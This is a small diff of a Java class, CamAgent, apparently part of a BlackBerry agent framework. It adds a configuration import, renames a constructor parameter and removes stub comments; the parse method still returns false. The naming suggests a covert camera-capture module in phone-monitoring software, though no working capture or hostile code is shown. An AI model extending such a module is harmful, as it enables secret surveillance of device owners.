@@ -10,17 +10,17 @@
 package blackberry.agent;
 
 import blackberry.Status;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The Class CamAgent.
  */
 public final class CamAgent extends Agent {
     //#ifdef DEBUG
     static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);
-
     //#endif
 
     /**
@@ -29,8 +29,8 @@ public final class CamAgent extends Agent {
      * @param agentStatus
      *            the agent status
      */
-    public CamAgent(final boolean agentStatus) {
-        super(Agent.AGENT_CAM, agentStatus, true, "CamAgent");
+    public CamAgent(final boolean agentEnabled) {
+        super(Agent.AGENT_CAM, agentEnabled, Conf.AGENT_CAM_ON_SD, "CamAgent");
     }
 
     /**
@@ -64,7 +64,7 @@ public final class CamAgent extends Agent {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        // TODO Auto-generated method stub
+        
         return false;
     }
 
